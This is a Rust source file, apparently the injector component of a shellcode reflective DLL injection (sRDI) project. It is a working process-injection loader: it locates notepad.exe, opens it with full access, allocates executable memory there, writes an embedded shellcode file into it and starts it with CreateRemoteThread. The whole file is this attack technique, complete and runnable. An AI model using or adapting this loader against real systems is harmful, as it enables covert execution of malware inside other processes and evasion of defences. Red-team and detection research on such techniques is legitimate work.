use std::{ptr::null_mut};
use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Diagnostics::Debug::{WriteProcessMemory}}, Foundation::{CloseHandle}};

use crate::pe_utils::{get_process_id_by_name};

mod pe_utils;

fn main() {
    env_logger::init();

    //inject.exe <process> <shellcode.bin>
    
    let process_id = get_process_id_by_name("notepad.exe") as u32;
    log::debug!("[+] Process ID: {}", process_id);

    // For normal RDI
    //let shellcode = include_bytes!(r"C:\Users\memn0ps\Documents\GitHub\srdi-rs\reflective_loader\target\debug\reflective_loader.dll");
    
    let image_bytes = include_bytes!(r"C:\Users\memn0ps\Documents\GitHub\srdi-rs\shellcode.bin");
    let module_size = image_bytes.len();
    let module_base = image_bytes.as_ptr();
    //let rdi_module_base = unsafe { module_base.add(SHELLCODE_SIZE) as usize };

    // Get a handle to the target process with PROCESS_ALL_ACCESS
    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            process_id
        )
    };

    if process_handle == 0 {
        panic!("Failed to open a handle to the target process");
    }

    log::debug!("[+] Process handle: {:?}", process_handle);

    // Allocate memory in the target process for the shellcode
    let shellcode_address = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            module_size, // was sizeOfImage for RDI
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };

    log::debug!("[+] Allocated memory in the target process for the shellcode: {:p}", shellcode_address);

    if shellcode_address.is_null() {
        panic!("Failed to allocate memory in the target process for the shellcode");
    }

    // Write the shellcode to the target process
    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            shellcode_address as _,
            module_base as _,
            module_size, // was sizeOfImage for RDI
            null_mut(),
        )
    };

    if wpm_result == 0 {
        panic!("Failed to write the image to the target process");
    }

    pause();

    // Create remote thread and execute our shellcode
    let thread_handle = unsafe { 
        CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(std::mem::transmute(shellcode_address as usize)), //used to be reflective_loader for normal RDI
        std::ptr::null_mut(), // Can be used to pass the first parameter to loader but we're using shellcode to call our loader with more parameters
        0,
        null_mut(),
        )
    };

    // Close thread handle
    unsafe { 
        CloseHandle(thread_handle);
        CloseHandle(process_handle); 
    };
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}